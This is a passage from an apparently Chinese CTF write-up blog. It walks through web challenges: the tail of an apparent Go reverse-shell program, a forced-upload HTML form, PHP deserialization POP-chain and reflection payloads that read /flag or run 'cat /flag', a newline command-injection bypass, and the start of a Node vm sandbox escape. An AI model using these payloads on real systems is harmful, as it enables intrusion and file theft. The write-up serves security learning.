class="comment">// 启动 Cmd 对象</span></span><br><span class="line">    err = cmd.Start()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待 Cmd 对象执行完毕</span></span><br><span class="line">    err = cmd.Wait()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    conn.Close()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出完成信息</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Shell session terminated&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(<strong>因为这里没有上传入口，所以我们得自己写一个html来强制上传</strong>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://d5e624ee.clsadp.com/Adm1nUp104d&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230611154326187.png" alt="image-20230611154326187"></p><p>成功</p><p><strong>总结</strong></p><ul><li>这题的看起来其实不难，难点是在能想到把<code>index</code>改成<code>admin</code>   并且不执著于页面的那个登录框</li></ul><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p><img src="../images/image-20230611155817651.png" alt="image-20230611155817651"></p><p>这里的话先查看源码</p><p><img src="../images/image-20230611155851957.png" alt="image-20230611155851957"></p><p>访问得到</p><p><img src="../images/image-20230611155914604.png" alt="image-20230611155914604"></p><p>接着访问</p><p><img src="../images/image-20230611155943182.png" alt="image-20230611155943182"></p><p>进行base64解码得到</p><p><img src="../images/image-20230611155959067.png" alt="image-20230611155959067"></p><p>然后访问之后拿到题目给的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">night</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$night</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;night . <span class="string">&#x27;哒咩哟&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">day</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$day</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">go</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">light</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;light-&gt;<span class="title function_ invoke__">d</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dark</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;dark)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="title function_ invoke__">hacked</span>(<span class="variable">$this</span>-&gt;dark));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hacked</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="number">0</span>,<span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;呆jio步&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\.\.*/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$s</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$un</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;‮⁦快给我传参⁩⁦pop&#x27;</span>]); <span class="comment">// </span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;seino&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;dark=<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;day=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">light</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;light=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;dark=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;day=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$n</span>=<span class="keyword">new</span> <span class="title function_ invoke__">night</span>();</span><br><span class="line"><span class="variable">$n</span>-&gt;night=<span class="variable">$e</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;night&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;night&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;day&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;day&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;dark&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;dark&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;light&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;light&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;day&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;day&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;dark&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;dark&quot;</span>;s:<span class="number">49</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话其实pop链不难构造，难的是怎么进行命令执行，当时卡了半天没成功</p><p>(<strong>这里的dark参数要传不同的值得序列化两边，并且使用不同的名字</strong>)</p><p>还有就是这里的post传参的话是有不可见字符的(<strong>复制进sublime就能看见了</strong>)</p><p><img src="../images/image-20230611172413530.png" alt="image-20230611172413530"></p><p>传参进行url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%E2%80%AE%E2%81%A6%E5%BF%AB%E7%BB%99%E6%88%91%E4%BC%A0%E5%8F%82%E2%81%A9%E2%81%A6pop</span><br></pre></td></tr></table></figure><p>因为这里抛出了一个异常，导致destruct方法没有被触发，</p><p>我们可以使用 <code>fast destruct</code>技巧提前触发 <code>__destruct()</code></p><p>这里我们可以删除最后一个大括号 <code>&#125;</code>：得到flag的base64编码</p><p><img src="../images/image-20230611172744069.png" alt="image-20230611172744069"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本质上，fast destruct 是因为unserialize过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的__destruct(),提前触发反序列化链条。</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/APPPQRS/p/16862351.html">fast destruct 详解</a></p><p><a href="https://zhuanlan.zhihu.com/p/405838002">PHP序列化冷知识</a>     ——-&gt;    这篇文章可以好好看看</p><p>这里的话还有另一种解法就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">night</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day-&gt;dark=<span class="keyword">new</span> <span class="title function_ invoke__">light</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day-&gt;dark-&gt;light=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day-&gt;dark-&gt;light-&gt;day=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>-&gt;night-&gt;day-&gt;dark-&gt;light-&gt;day-&gt;dark=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">array</span>(<span class="variable">$t</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure><p><strong>把实例化后的night放入到数组里在进行实例化 </strong>    这样也可以进行绕过</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>访问直接给了代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password==<span class="string">&quot;‮⁦  //how to change the private variables⁩⁦secret&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230611175801822.png" alt="image-20230611175801822"></p><p>这里的给的php太低，如果给高的话，可以直接修改源码里的private</p><p>好像是php7以上就可以来着</p><p><img src="../images/image-20230611180105554.png" alt="image-20230611180105554"></p><p>给了个提示</p><p><img src="../images/image-20230611180122824.png" alt="image-20230611180122824"></p><p>这些东西就是反射的东西，学过java反射的话应该对这个很熟悉</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"><span class="variable">$refl</span> = <span class="keyword">new</span> <span class="title class_">ReflectionObject</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$pwd</span> = <span class="variable">$refl</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="variable">$pwd</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$pwd</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$flag</span>,<span class="string">&quot;%E2%80%AE%E2%81%A6%20%20%2F%2Fhow%20to%20change%20the%20private%20variables%E2%81%A9%E2%81%A6secret&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$refl</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$cmd</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$flag</span>,<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个反射的话去google一下就会出来</p><p>这里的编码的原因是因为又是这个不可见字符搞的鬼</p><p><img src="../images/image-20230611180412719.png" alt="image-20230611180412719"></p><p><img src="../images/image-20230611180503819.png" alt="image-20230611180503819"></p><p><strong>总结</strong></p><ul><li>php反射修改属性</li><li>不可见字符的url编码</li></ul><p><strong>这题还有个非预期</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=system%<span class="number">0</span>a(<span class="string">&#x27;ls /&#x27;</span>);</span><br><span class="line">a=system%<span class="number">0</span>a(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="Esc4pe-T0-Mong0"><a href="#Esc4pe-T0-Mong0" class="headerlink" title="Esc4pe_T0_Mong0"></a><strong>Esc4pe_T0_Mong0</strong></h2><p>这道题是一道沙箱逃逸的题目  网上可以搜到CVE</p><p>题目给了源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Code</span> <span class="title class_">Execution</span> <span class="title class_">Demo</span></span><br><span class="line"><span class="number">2</span>+<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Execute</span> <span class="title class_">Read</span> <span class="title class_">Source</span> <span class="title class_">Code</span></span><br><span class="line"><span class="title class_">Source</span> <span class="title class_">Code</span>:</span><br><span class="line"><span class="comment">//const &#123; MongoClient &#125; = require(&quot;mongodb&quot;);</span></span><br><span class="line"><span class="comment">//const client = new MongoClient(&quot;mongodb://localhost:27017/&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isValidCode</span> = (<span class="params">code</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> isLengthValid = code.<span class="property">length</span> &lt; <span class="number">365</span>;</span><br><span class="line">    <span class="keyword">const</span> isASCII = <span class="regexp">/^[\x20-\x7e]+$/</span>.<span class="title function_">test</span>(code);</span><br><span class="line">    <span class="keyword">const</span> containsInvalidChars = <span class="regexp">/[.\[\]&#123;&#125;\s;`&#x27;&quot;/\\_&lt;&gt;?:]/</span>.<span class="title function_">test</span>(code);</span><br><span class="line">    <span class="keyword">const</span> doesNotContainImport = !code.<span class="title function_">toLowerCase</span>().<span class="title function_">includes</span>(<span class="string">&quot;import&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> doesNotContainUnescape = !<span class="regexp">/%(?:d0|d1|%[89abAB][0-9a-fA-F])/</span>.<span class="title function_">test</span>(code);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      isLengthValid &amp;&amp;</span><br><span class="line">      isASCII &amp;&amp;</span><br><span class="line">      !containsInvalidChars &amp;&amp;</span><br><span class="line">      doesNotContainImport &amp;&amp;</span><br><span class="line">      doesNotContainUnescape</span><br><span class="line">    );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>( __dirname + <span class="string">&quot;/static/index.html&quot;</span> );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/readfile&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>( __dirname + <span class="string">&quot;/app.js&quot;</span> );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/exec&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> code = req.<span class="property">query</span>.<span class="property">code</span>;</span><br><span class="line">    <span class="keyword">if</span> (!code) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;Code is required.&#x27;</span> &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isValidCode</span>(code)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line">            <span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(code);</span><br><span class="line">            <span class="keyword">const</span> result = script.<span class="title function_">runInNewContext</span>(sandbox);</span><br><span class="line">            res.<span class="title function_">json</span>(&#123; result &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;you cant bypass my vm best waf!&#x27;</span> &#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//app.get(&#x27;/getflag&#x27;, function (req, res) &#123;</span></span><br><span class="line"><span class="comment">//    todo...</span></span><br><span class="line"><span class="comment">//&#125;);</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`nodeapp listening on http://localhost:3000`</span>));</span><br></pre></td></tr></table></figure><p>代码执行在这一块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(code);</span><br><span class="line"><span class="keyword">const</span> result = script.<span class="title function_">runInNewContext</span>(sandbox);</span><br><span class="line">res.<span class="title function_">json</span>(&#123; result &#125;);</span><br></pre></td></tr></table></figure><p>直接搜索mongo vm 沙箱逃逸就文章就出来了   poc也出来了</p><p><img src="../images/image-20230611213840311.png" alt="image-20230611213840311"></p><p>但是这里的会对我们传进来的值进行过滤</p><p><img 